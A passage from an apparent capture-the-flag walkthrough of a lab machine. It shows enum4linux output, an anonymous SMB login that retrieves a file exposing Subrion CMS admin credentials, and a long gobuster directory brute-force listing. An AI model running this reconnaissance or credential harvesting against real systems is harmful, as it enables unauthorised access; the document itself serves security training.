S-1-5-21-2071169391-1069193170-3284189824-1031 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1032 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1033 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1034 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1035 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1036 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1037 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1038 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1039 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1040 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1041 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1042 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1043 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1044 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1045 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1046 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1047 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1048 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1049 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1050 *unknown*\*unknown* (8)

 ============================================= 
|    Getting printer info for 10.10.67.176    |
 ============================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 995.
No printers returned.


enum4linux complete on Sun Apr 17 04:12:51 2022
```

5. Login to the smb share anonymously and download the text file. We find the credentials to Subrion CMS
```
root@ip-10-10-210-138:~# smbclient -N \\\\10.10.67.176\\websvr\\
WARNING: The "syslog" option is deprecated
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 29 08:17:38 2021
  ..                                  D        0  Sat May 29 08:03:47 2021
  enter.txt                           N      273  Sat May 29 08:17:38 2021

		8460484 blocks of size 1024. 5699568 blocks available
smb: \> get enter.txt 
getting file \enter.txt of size 273 as enter.txt (88.9 KiloBytes/sec) (average 88.9 KiloBytes/sec)
smb: \> 
```
```
root@ip-10-10-210-138:~# cat enter.txt
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->
```

6. Trying to access `/subrion` doesn't work, so try to brute force directories with gobuster. We get an error are are suggested to use `--wildcard`. Use it and we find a lot of directories. We find that `/panel` leads us to a login page
```
root@ip-10-10-210-138:~# gobuster dir -u http://10.10.67.176/subrion -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.67.176/subrion
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/04/17 04:30:32 Starting gobuster
===============================================================
Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.67.176/subrion/1c00beaa-f296-4f38-9704-f999b54d2188 => 301. To force processing of Wildcard responses, specify the '--wildcard' switch
```
```
root@ip-10-10-210-138:~# gobuster dir --wildcard -u http://10.10.67.176/subrion -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.67.176/subrion
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/04/17 04:31:21 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/.cache (Status: 302)
/.git/HEAD (Status: 302)
/.config (Status: 302)
/.cvs (Status: 302)
/.cvsignore (Status: 302)
/.forward (Status: 302)
/.history (Status: 302)
/.listings (Status: 302)
/.mysql_history (Status: 302)
/.listing (Status: 302)
/.passwd (Status: 302)
/.perf (Status: 302)
/.profile (Status: 302)
/.sh_history (Status: 302)
/.rhosts (Status: 302)
/_adm (Status: 301)
/.ssh (Status: 302)
/_ajax (Status: 301)
/_admin (Status: 301)
/.subversion (Status: 302)
/.svn (Status: 302)
/_backup (Status: 301)
/_assets (Status: 301)
/_baks (Status: 301)
/_archive (Status: 301)
/.svn/entries (Status: 302)
/_cache (Status: 301)
/_catalogs (Status: 301)
/_code (Status: 301)
/_borders (Status: 301)
/.bash_history (Status: 302)
/_common (Status: 301)
/_database (Status: 301)
/@ (Status: 302)
/.web (Status: 302)
/_css (Status: 301)
/_ (Status: 302)
/_conf (Status: 301)
/_data (Status: 301)
/_config (Status: 301)
/_flash (Status: 301)
/_dummy (Status: 301)
/_dev (Status: 301)
/_db_backups (Status: 301)
/_derived (Status: 301)
/_fpclass (Status: 301)
/_files (Status: 301)
/_img (Status: 301)
/.bashrc (Status: 302)
/_images (Status: 301)
/_includes (Status: 301)
/_install (Status: 301)
/_inc (Status: 301)
/_mem_bin (Status: 301)
/_js (Status: 301)
/_layouts (Status: 301)
/_include (Status: 301)
/_media (Status: 301)
/_lib (Status: 301)
/_mm (Status: 301)
/_net (Status: 301)
/_pages (Status: 301)
/_mmserverscripts (Status: 301)
/_mygallery (Status: 301)
/_notes (Status: 301)
/_old (Status: 301)
/_reports (Status: 301)
/_overlay (Status: 301)
/_scriptlibrary (Status: 301)
/_res (Status: 301)
/_source (Status: 301)
/_resources (Status: 301)
/_scripts (Status: 301)
/_src (Status: 301)
/_stats (Status: 301)
/_private (Status: 301)
/_styles (Status: 301)
/_swf (Status: 301)
/_template (Status: 301)
/_temp (Status: 301)
/_tmpfileop (Status: 301)
/_templates (Status: 301)
/_test (Status: 301)
/_tempalbums (Status: 301)
/_tmp (Status: 301)
/_vti_cnf (Status: 301)
/_vti_log (Status: 301)
/_vti_inf (Status: 301)
/_vti_bin (Status: 301)
/_vti_aut (Status: 301)
/_themes (Status: 301)
/_vti_map (Status: 301)
/_vti_pvt (Status: 301)
/_www (Status: 301)
/_vti_rpc (Status: 301)
/~adm (Status: 301)
/_vti_txt (Status: 301)
/_vti_script (Status: 301)
/~admin (Status: 301)
/~apache (Status: 301)
/~administrator (Status: 301)
/~bin (Status: 301)
/~ftp (Status: 301)
/~guest (Status: 301)
/~amanda (Status: 301)
/_vti_bin/_vti_adm/admin.dll (Status: 302)
/_vti_bin/shtml.dll (Status: 302)
/_vti_bin/_vti_aut/author.dll (Status: 302)
/~lp (Status: 301)
/~log (Status: 301)
/~httpd (Status: 301)
/~nobody (Status: 301)
/~http (Status: 301)
/~mail (Status: 301)
/~logs (Status: 301)
/~operator (Status: 301)
/~root (Status: 301)
/~sysadm (Status: 301)
/~tmp (Status: 301)
/~sysadmin (Status: 301)
/~user (Status: 301)
/~webmaster (Status: 301)
/02 (Status: 301)
/~www (Status: 301)
/01 (Status: 301)
/~test (Status: 301)
/03 (Status: 301)
/06 (Status: 301)
/05 (Status: 301)
/04 (Status: 301)
/07 (Status: 301)
/~sys (Status: 301)
/08 (Status: 301)
/09 (Status: 301)
/100 (Status: 301)
/00 (Status: 301)
/1000 (Status: 301)
/1001 (Status: 301)
/102 (Status: 301)
/101 (Status: 301)
/10 (Status: 301)
/103 (Status: 301)
/12 (Status: 301)
/11 (Status: 301)
/123 (Status: 301)
/15 (Status: 301)
/13 (Status: 301)
/14 (Status: 301)
/1990 (Status: 301)
/1991 (Status: 301)
/1992 (Status: 301)
/1993 (Status: 301)
/1994 (Status: 301)
/1995 (Status: 301)
/1996 (Status: 301)
/1998 (Status: 301)
/1999 (Status: 301)
/1997 (Status: 301)
/1x1 (Status: 301)
/200 (Status: 301)
/20 (Status: 301)
/0 (Status: 302)
/1 (Status: 302)
/2 (Status: 302)
/2000 (Status: 301)
/2008 (Status: 301)
/2006 (Status: 301)
/2007 (Status: 301)
/2010 (Status: 301)
/2009 (Status: 301)
/2005 (Status: 301)
/2003 (Status: 301)
/2004 (Status: 301)
/2012 (Status: 301)
/2011 (Status: 301)
/21 (Status: 301)
/2013 (Status: 301)
/22 (Status: 301)
/2257 (Status: 301)
/23 (Status: 301)
/2002 (Status: 301)
/24 (Status: 301)
/2g (Status: 301)
/2001 (Status: 301)
/25 (Status: 301)
/30 (Status: 301)
/32 (Status: 301)
/3rdparty (Status: 301)
/3g (Status: 301)
/300 (Status: 301)
/400 (Status: 301)
/401 (Status: 301)
/403 (Status: 301)
/404 (Status: 301)
/50 (Status: 301)
/42 (Status: 301)
/500 (Status: 301)
/51 (Status: 301)
/64 (Status: 301)
/7z (Status: 301)
/2014 (Status: 301)
/96 (Status: 301)
/3 (Status: 302)
/aa (Status: 301)
/abc (Status: 301)
/4 (Status: 302)
/aaa (Status: 301)
/abc123 (Status: 301)
/abcd (Status: 301)
/abcd1234 (Status: 301)
/5 (Status: 302)
/About (Status: 301)
/7 (Status: 302)
/aboutus (Status: 301)
/6 (Status: 302)
/about (Status: 301)
/AboutUs (Status: 301)
/8 (Status: 302)
/abuse (Status: 301)
/about_us (Status: 301)
/9 (Status: 302)
/academics (Status: 301)
/about-us (Status: 301)
/abstract (Status: 301)
/academic (Status: 301)
/a (Status: 302)
/access (Status: 301)
/ac (Status: 301)
/acatalog (Status: 301)
/acc (Status: 301)
/accessibility (Status: 301)
/access_db (Status: 301)
/access_log (Status: 301)
/access-log (Status: 301)
/accessgranted (Status: 301)
/accessories (Status: 301)
/accommodation (Status: 301)
/account_edit (Status: 301)
/account (Status: 301)
/account_history (Status: 301)
/accountants (Status: 301)
/accounting (Status: 301)
/A (Status: 302)
/accounts (Status: 301)
/acct_login (Status: 301)
/achitecture (Status: 301)
/accountsettings (Status: 301)
/action (Status: 301)
/acp (Status: 301)
/act (Status: 301)
/actions (Status: 301)
/activate (Status: 301)
/activeCollab (Status: 301)
/active (Status: 301)
/activex (Status: 301)
/activities (Status: 301)
/ad (Status: 301)
/ad_js (Status: 301)
/adclick (Status: 301)
/add (Status: 301)
/activity (Status: 301)
/adaptive (Status: 301)
/add_cart (Status: 301)
/access.1 (Status: 302)
/addfav (Status: 301)
/addnews (Status: 301)
/addreply (Status: 301)
/addons (Status: 301)
/address_book (Status: 301)
/addpost (Status: 301)
/addressbook (Status: 301)
/address (Status: 301)
/access-log.1 (Status: 302)
/admin (Status: 301)
/adlog (Status: 301)
/adlogger (Status: 301)
/adm (Status: 301)
/access_log.1 (Status: 302)
/Admin (Status: 301)
/ADMIN (Status: 301)
/ADM (Status: 301)
/addresses (Status: 301)
/addtocart (Status: 301)
/admin_area (Status: 301)
/admin_index (Status: 301)
/admin_ (Status: 301)
/admin_login (Status: 301)
/admin_banner (Status: 301)
/admin_c (Status: 301)
/admin_interface (Status: 301)
/admin1 (Status: 301)
/admin2 (Status: 301)
/admin3 (Status: 301)
/admin_logon (Status: 301)
/admin4_colon (Status: 301)
/admin-admin (Status: 301)
/admin4_account (Status: 301)
/admin-console (Status: 301)
/admincp (Status: 301)
/admincontrol (Status: 301)
/admin-interface (Status: 301)
/adminhelp (Status: 301)
/administracion (Status: 301)
/administr8 (Status: 301)
/administer (Status: 301)
/administrador (Status: 301)
/administratie (Status: 301)
/administrat (Status: 301)
/administration (Status: 301)
/administratoraccounts (Status: 301)
/administrator (Status: 301)
/Administration (Status: 301)
/administrivia (Status: 301)
/administrators (Status: 301)
/adminlogin (Status: 301)
/adminlogon (Status: 301)
/admins (Status: 301)
/adminpanel (Status: 301)
/adminpro (Status: 301)
/AdminService (Status: 301)
/adminsessions (Status: 301)
/adminsql (Status: 301)
/admintools (Status: 301)
/admissions (Status: 301)
/admon (Status: 301)
/AdminTools (Status: 301)
/admin.php (Status: 302)
/admin.pl (Status: 302)
/adodb (Status: 301)
/ADMON (Status: 301)
/adv_counter (Status: 301)
/ads (Status: 301)
/adobe (Status: 301)
/advanced (Status: 301)
/adv (Status: 301)
/admin.cgi (Status: 302)
/adsl (Status: 301)
/adserver (Status: 301)
/advert (Status: 301)
/adverts (Status: 301)
/advancedsearch (Status: 301)
/advertise (Status: 301)
/advanced_search (Status: 301)
/advertisement (Status: 301)
/advertisers (Status: 301)
/advertising (Status: 301)
/advice (Status: 301)
/adview (Status: 301)
/af (Status: 301)
/aff (Status: 301)
/advisories (Status: 301)
/affiche (Status: 301)
/affiliate_info (Status: 301)
/affiliate (Status: 301)
/affiliate_terms (Status: 301)
/affiliates (Status: 301)
/affiliatewiz (Status: 301)
/africa (Status: 301)
/agb (Status: 301)
/agenda (Status: 301)
/agent (Status: 301)
/agents (Status: 301)
/aggregator (Status: 301)
/AggreSpy (Status: 301)
/ajax (Status: 301)
/ajax_cron (Status: 301)
/agency (Status: 301)
/akamai (Status: 301)
/alarm (Status: 301)
/alias (Status: 301)
/alarms (Status: 301)
/album (Status: 301)
/alcatel (Status: 301)
/albums (Status: 301)
/alert (Status: 301)
/alerts (Status: 301)
/aliases (Status: 301)
/all (Status: 301)
/all-wcprops (Status: 301)
/alpha (Status: 301)
/alltime (Status: 301)
/alt (Status: 301)
/alumni_add (Status: 301)
/alumni (Status: 301)
/alumni_details (Status: 301)
/alumni_info (Status: 301)
/am (Status: 301)
/alumni_reunions (Status: 301)
/alumni_update (Status: 301)
/amanda (Status: 301)
/amazon (Status: 301)
/amember (Status: 301)
/analyse (Status: 301)
/analog (Status: 301)
/analysis (Status: 301)
/analytics (Status: 301)
/and (Status: 301)
/announcement (Status: 301)
/announce (Status: 301)
/annuaire (Status: 301)
/android (Status: 301)
/announcements (Status: 301)
/annual (Status: 301)
/anon (Status: 301)
/anon_ftp (Status: 301)
/anonymous (Status: 301)
/answer (Status: 301)
/answers (Status: 301)
/antispam (Status: 301)
/ansi (Status: 301)
/antibot_image (Status: 301)
/antivirus (Status: 301)
/any (Status: 301)
/anuncios (Status: 301)
/aol (Status: 301)
/apanel (Status: 301)
/apache (Status: 301)
/apac (Status: 301)
/ap (Status: 301)
/apc (Status: 301)
/apexec (Status: 301)
/apl (Status: 301)
/apis (Status: 301)
/apm (Status: 301)
/akeeba.backend.log (Status: 302)
/app (Status: 301)
/app_browser (Status: 301)
/app_themes (Status: 301)
/append (Status: 301)
/app_data (Status: 301)
/app_code (Status: 301)
/api (Status: 301)
/appeals (Status: 301)
/app_browsers (Status: 301)
/appeal (Status: 301)
/apple (Status: 301)
/appl (Status: 301)
/applet (Status: 301)
/appliance (Status: 301)
/applets (Status: 301)
/application (Status: 301)
/applications (Status: 301)
/apply (Status: 301)
/AppsLogin (Status: 301)
/arcade (Status: 301)
/appliation (Status: 301)
/apr (Status: 301)
/AppsLocalLogin (Status: 301)
/arbeit (Status: 301)
/arch (Status: 301)
/ar (Status: 301)
/apps (Status: 301)
/architect (Status: 301)
/application.wadl (Status: 302)
/architecture (Status: 301)
/art (Status: 301)
/arquivos (Status: 301)
/array (Status: 301)
/ars (Status: 301)
/arrow (Status: 301)
/archivos (Status: 301)
/archives (Status: 301)
/archiv (Status: 301)
/archive (Status: 301)
/Archive (Status: 301)
/article (Status: 301)
/Articles (Status: 301)
/articles (Status: 301)
/artikel (Status: 301)
/artists (Status: 301)
/as (Status: 301)
/arts (Status: 301)
/asdf (Status: 301)
/ashley (Status: 301)
/ask_a_question (Status: 301)
/askapache (Status: 301)
/artwork (Status: 301)
/ask (Status: 301)
/aspdnsfencrypt (Status: 301)
/aspadmin (Status: 301)
/asp (Status: 301)
/aspdnsfgateways (Status: 301)
/asia (Status: 301)
/asps (Status: 301)
/aspnet_client (Status: 301)
/assetmanage (Status: 301)
/aspdnsfpatterns (Status: 301)
/aspdnsfcommon (Status: 301)
/assets (Status: 301)
/aspx (Status: 301)
/asmx (Status: 301)
/at (Status: 301)
/asset (Status: 301)
/assetmanagement (Status: 301)
/attach (Status: 301)
/atom (Status: 301)
/attachment (Status: 301)
/attach_mod (Status: 301)
/ascii (Status: 301)
/AT-admin.cgi (Status: 302)
/attachs (Status: 301)
/attachments (Status: 301)
/attic (Status: 301)
/auctions (Status: 301)
/au (Status: 301)
/auction (Status: 301)
/authentication (Status: 301)
/author (Status: 301)
/audio (Status: 301)
/audit (Status: 301)
/authoring (Status: 301)
/authorization (Status: 301)
/authors (Status: 301)
/authusers (Status: 301)
/authorized_keys (Status: 301)
/auto (Status: 301)
/audits (Status: 301)
/autobackup (Status: 301)
/autocheck (Status: 301)
/autodeploy (Status: 301)
/automatic (Status: 301)
/autodiscover (Status: 301)
/authuser (Status: 301)
/autologin (Status: 301)
/automation (Status: 301)
/automotive (Status: 301)
/award (Status: 301)
/aux (Status: 301)
/av (Status: 301)
/avatar (Status: 301)
/avatars (Status: 301)
/aw (Status: 301)
/awards (Status: 301)
/awardingbodies (Status: 301)
/awmdata (Status: 301)
/awl (Status: 301)
/awstats (Status: 301)
/axis (Status: 301)
/axis2 (Status: 301)
/axis2-admin (Status: 301)
/axis-admin (Status: 301)
/axs (Status: 301)
/az (Status: 301)
/b1 (Status: 301)
/b2c (Status: 301)
/b2b (Status: 301)
/auth (Status: 301)
/back (Status: 301)
/backend (Status: 301)
/background (Status: 301)
/backoffice (Status: 301)
/back-up (Status: 301)
/BackOffice (Status: 301)
/backgrounds (Status: 301)
/backdoor (Status: 301)
/backup2 (Status: 301)
/backup_migrate (Status: 301)
/backups (Status: 301)
/bak (Status: 301)
/bad_link (Status: 301)
/backup-db (Status: 301)
/balances (Status: 301)
/bak-up (Status: 301)
/bakup (Status: 301)
/backup (Status: 301)
/ban (Status: 301)
/banned (Status: 301)
/bandwidth (Status: 301)
/balance (Status: 301)
/banking (Status: 301)
/banks (Status: 301)
/banner (Status: 301)
/banner_element (Status: 301)
/bank (Status: 301)
/banneradmin (Status: 301)
/banner2 (Status: 301)
/base (Status: 301)
/awstats.conf (Status: 302)
/bannerads (Status: 301)
/bar (Status: 301)
/B (Status: 302)
/banners (Status: 301)
/Base (Status: 301)
/b (Status: 302)
/basket (Status: 301)
/baseball (Status: 301)
/bash (Status: 301)
/basic (Status: 301)
/baz (Status: 301)
/baskets (Status: 301)
/bat (Status: 301)
/basketball (Status: 301)
/batch (Status: 301)
/bb (Status: 301)
/bass (Status: 301)
/bbadmin (Status: 301)
/bbclone (Status: 301)
/bb-hist (Status: 301)
/bb-histlog (Status: 301)
/be (Status: 301)
/bboard (Status: 301)
/bc (Status: 301)
/bbs (Status: 301)
/bd (Status: 301)
/bdata (Status: 301)
/bea (Status: 301)
/beheer (Status: 301)
/beans (Status: 301)
/bean (Status: 301)
/beehive (Status: 301)
/benefits (Status: 301)
/best (Status: 301)
/beta (Status: 301)
/benutzer (Status: 301)
/bfc (Status: 301)
/bg (Status: 301)
/bigadmin (Status: 301)
/big (Status: 301)
/bigip (Status: 301)
/bilder (Status: 301)
/bill (Status: 301)
/billing (Status: 301)
/binaries (Status: 301)
/bin (Status: 301)
/binary (Status: 301)
/bins (Status: 301)
/bio (Status: 301)
/bios (Status: 301)
/bitrix (Status: 301)
/biz (Status: 301)
/bk (Status: 301)
/bkup (Status: 301)
/black (Status: 301)
/blah (Status: 301)
/bl (Status: 301)
/blank (Status: 301)
/blb (Status: 301)
/blocks (Status: 301)
/block (Status: 301)
/blocked (Status: 301)
/blog (Status: 301)
/Blog (Status: 301)
/blog_ajax (Status: 301)
/blog_report (Status: 301)
/blog_inlinemod (Status: 301)
/blog_search (Status: 301)
/blog_usercp (Status: 301)
/blogger (Status: 301)
/bloggers (Status: 301)
/blogindex (Status: 301)
/blogspot (Status: 301)
/blue (Status: 301)
/bm (Status: 301)
/bmz_cache (Status: 301)
/bnnr (Status: 301)
/boards (Status: 301)
/blow (Status: 301)
/blogs (Status: 301)
/body (Status: 301)
/bob (Status: 301)
/board (Status: 301)
/boiler (Status: 301)
/bofh (Status: 301)
/bonuses (Status: 301)
/book (Status: 301)
/boilerplate (Status: 301)
/bo (Status: 301)
/bonus (Status: 301)
/bookmark (Status: 301)
/booking (Status: 301)
/bookstore (Status: 301)
/boot (Status: 301)
/Books (Status: 301)
/booker (Status: 301)
/books (Status: 301)
/bookmarks (Status: 301)
/bot (Status: 301)
/boost_stats (Status: 301)
/boutique (Status: 301)
/bots (Status: 301)
/bottom (Status: 301)
/box (Status: 301)
/boxes (Status: 301)
/br (Status: 301)
/brand (Status: 301)
/brands (Status: 301)
/brochure (Status: 301)
/broadband (Status: 301)
/bot-trap (Status: 301)
/brochures (Status: 301)
/broken (Status: 301)
/broken_link (Status: 301)
/bt (Status: 301)
/broker (Status: 301)
/browse (Status: 301)
/browser (Status: 301)
/Browser (Status: 301)
/bsd (Status: 301)
/bs (Status: 301)
/bug (Status: 301)
/bugs (Status: 301)
/build (Status: 301)
/BUILD (Status: 301)
/buildr (Status: 301)
/builder (Status: 301)
/bulksms (Status: 301)
/bullet (Status: 301)
/buscador (Status: 301)
/busca (Status: 301)
/buscar (Status: 301)
/business (Status: 301)
/bulk (Status: 301)
/Business (Status: 301)
/button (Status: 301)
/buttons (Status: 301)
/buynow (Status: 301)
/buy (Status: 301)
/buyproduct (Status: 301)
/bz2 (Status: 301)
/bypass (Status: 301)
/ca (Status: 301)
/cache (Status: 301)
/cachemgr (Status: 301)
/cabinet (Status: 301)
/caching (Status: 301)
/cadmins (Status: 301)
/cad (Status: 301)
/calc (Status: 301)
/cal (Status: 301)
/calendar_events (Status: 301)
/calendar (Status: 301)
/calendar_sports (Status: 301)
/calendarevents (Status: 301)
/calendars (Status: 301)
/calender (Status: 301)
/callee (Status: 301)
/call (Status: 301)
/callback (Status: 301)
/callin (Status: 301)
/caller (Status: 301)
/calling (Status: 301)
/camel (Status: 301)
/callout (Status: 301)
/campaign (Status: 301)
/cam (Status: 301)
/campaigns (Status: 301)
/can (Status: 301)
/canada (Status: 301)
/car (Status: 301)
/captcha (Status: 301)
/C (Status: 302)
/cachemgr.cgi (Status: 302)
/c (Status: 302)
/cards (Status: 301)
/career (Status: 301)
/cardinalform (Status: 301)
/cardinal (Status: 301)
/cardinalauth (Status: 301)
/card (Status: 301)
/carbuyaction (Status: 301)
/careers (Status: 301)
/carp (Status: 301)
/carpet (Status: 301)
/cars (Status: 301)
/cart (Status: 301)
/carts (Status: 301)
/cas (Status: 301)
/casestudies (Status: 301)
/cat (Status: 301)
/catalog (Status: 301)
/cash (Status: 301)
/catalogue (Status: 301)
/catalyst (Status: 301)
/categoria (Status: 301)
/catch (Status: 301)
/categories (Status: 301)
/carthandler (Status: 301)
/cases (Status: 301)
/category (Status: 301)
/catinfo (Status: 301)
/cats (Status: 301)
/cc (Status: 301)
/cb (Status: 301)
/catalogsearch (Status: 301)
/catalogs (Status: 301)
/ccp14admin (Status: 301)
/ccs (Status: 301)
/cd (Status: 301)
/centres (Status: 301)
/cdrom (Status: 301)
/ccbill (Status: 301)
/certenroll (Status: 301)
/cert (Status: 301)
/ccount (Status: 301)
/certificate (Status: 301)
/catalog.wci (Status: 302)
/certserver (Status: 301)
/cfc (Status: 301)
/certs (Status: 301)
/certification (Status: 301)
/certified (Status: 301)
/certificates (Status: 301)
/certsrv (Status: 301)
/cf (Status: 301)
/cfusion (Status: 301)
/cfg (Status: 301)
/cfide (Status: 301)
/cgi_bin (Status: 301)
/cfcache (Status: 301)
/cgi (Status: 301)
/cfm (Status: 301)
/cgi-bin (Status: 301)
/cgibin (Status: 301)
/cgi-data (Status: 301)
/cgi-bin2 (Status: 301)
/cgi-exe (Status: 301)
/cgi-local (Status: 301)
/cgi-home (Status: 301)
/cgi-image (Status: 301)
/cgi-perl (Status: 301)
/cgi-shl (Status: 301)
/cgi-pub (Status: 301)
/cfdocs (Status: 301)
/cgi-script (Status: 301)
/cgis (Status: 301)
/cgi-sys (Status: 301)
/cgi-win (Status: 301)
/cgi-web (Status: 301)
/cgiwrap (Status: 301)
/cgm-web (Status: 301)
/ch (Status: 301)
/change_password (Status: 301)
/chan (Status: 301)
/change (Status: 301)
/changed (Status: 301)
/ChangeLog (Status: 301)
/changelog (Status: 301)
/changepw (Status: 301)
/changepassword (Status: 301)
/changes (Status: 301)
/changepwd (Status: 301)
/charge (Status: 301)
/channel (Status: 301)
/charges (Status: 301)
/charts (Status: 301)
/chart (Status: 301)
/chat (Status: 301)
/chats (Status: 301)
/checking (Status: 301)
/check (Status: 301)
/checkout (Status: 301)
/checkout_iclear (Status: 301)
/checkoutanon (Status: 301)
/checkoutreview (Status: 301)
/checkpoint (Status: 301)
/children (Status: 301)
/checks (Status: 301)
/child (Status: 301)
/china (Status: 301)
/chk (Status: 301)
/choosing (Status: 301)
/chpwd (Status: 301)
/chris (Status: 301)
/chrome (Status: 301)
/cisco (Status: 301)
/cinema (Status: 301)
/cgi-bin/ (Status: 302)
/chpasswd (Status: 301)
/cisweb (Status: 301)
/citrix (Status: 301)
/claims (Status: 301)
/cl (Status: 301)
/ckfinder (Status: 301)
/ck (Status: 301)
/classic (Status: 301)
/city (Status: 301)
/cities (Status: 301)
/classified (Status: 301)
/classifieds (Status: 301)
/class (Status: 301)
/cleanup (Status: 301)
/clear (Status: 301)
/classes (Status: 301)
/classroompages (Status: 301)
/claim (Status: 301)
/ckeditor (Status: 301)
/clearcookies (Status: 301)
/clearpixel (Status: 301)
/click (Status: 301)
/clickheat (Status: 301)
/clientapi (Status: 301)
/clientaccesspolicy (Status: 301)
/clickout (Status: 301)
/clicks (Status: 301)
/clk (Status: 301)
/clock (Status: 301)
/clientes (Status: 301)
/client (Status: 301)
/clients (Status: 301)
/closing (Status: 301)
/club (Status: 301)
/clientscript (Status: 301)
/clipart (Status: 301)
/close (Status: 301)
/closed (Status: 301)
/cm (Status: 301)
/cluster (Status: 301)
/cmd (Status: 301)
/clips (Status: 301)
/cmpi_popup (Status: 301)
/clusters (Status: 301)
/cms (Status: 301)
/CMS (Status: 301)
/cmsadmin (Status: 301)
/cn (Status: 301)
/cnf (Status: 301)
/cnstats (Status: 301)
/co (Status: 301)
/code (Status: 301)
/cnt (Status: 301)
/cocoon (Status: 301)
/codec (Status: 301)
/codecs (Status: 301)
/codepages (Status: 301)
/codes (Status: 301)
/coffee (Status: 301)
/coke (Status: 301)
/coldfusion (Status: 301)
/collapse (Status: 301)
/collection (Status: 301)
/college (Status: 301)
/columnists (Status: 301)
/cognos (Status: 301)
/com (Status: 301)
/com2 (Status: 301)
/com_sun_web_ui (Status: 301)
/columns (Status: 301)
/comm (Status: 301)
/comics (Status: 301)
/comment (Status: 301)
/com1 (Status: 301)
/command (Status: 301)
/com3 (Status: 301)
/commerce (Status: 301)
/commented (Status: 301)
/commun (Status: 301)
/comment-page (Status: 301)
/comment-page-1 (Status: 301)
/commoncontrols (Status: 301)
/common (Status: 301)
/commentary (Status: 301)
/commercial (Status: 301)
/communication (Status: 301)
/comments (Status: 301)
/communications (Status: 301)
/company (Status: 301)
/communities (Status: 301)
/comparison (Status: 301)
/community (Status: 301)
/companies (Status: 301)
/compare (Status: 301)
/compiled (Status: 301)
/comp (Status: 301)
